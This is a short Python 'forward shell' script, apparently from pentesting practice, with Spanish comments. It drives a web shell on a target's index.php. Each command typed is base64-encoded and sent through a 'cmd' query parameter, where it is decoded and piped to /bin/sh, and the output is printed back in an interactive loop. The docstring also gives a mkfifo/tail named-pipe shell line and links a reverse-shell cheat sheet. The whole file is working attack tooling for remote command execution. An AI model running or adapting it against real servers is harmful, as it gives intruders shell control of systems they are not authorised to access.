#!/usr/bin/env python3
"""

Forward Shell

Comandos para reverse shell: 
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

mkfifo input; tail -f input | /bin/sh 2>&1 > output

"""

import requests
import signal
import sys

from termcolor import colored
from base64 import b64encode

def def_handler(sig, frame):

    print(colored("\n[!] Exiting...", "blue"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/index.php"


def run_command(command):

    command = b64encode(command.encode()).decode()

    data = {
        'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
    }

    r = requests.get(main_url, params=data)

    return r.text


if __name__ == '__main__':

    while True:

        command = input(colored("> ", "yellow"))
        output_command = run_command(command)

        print(output_command)
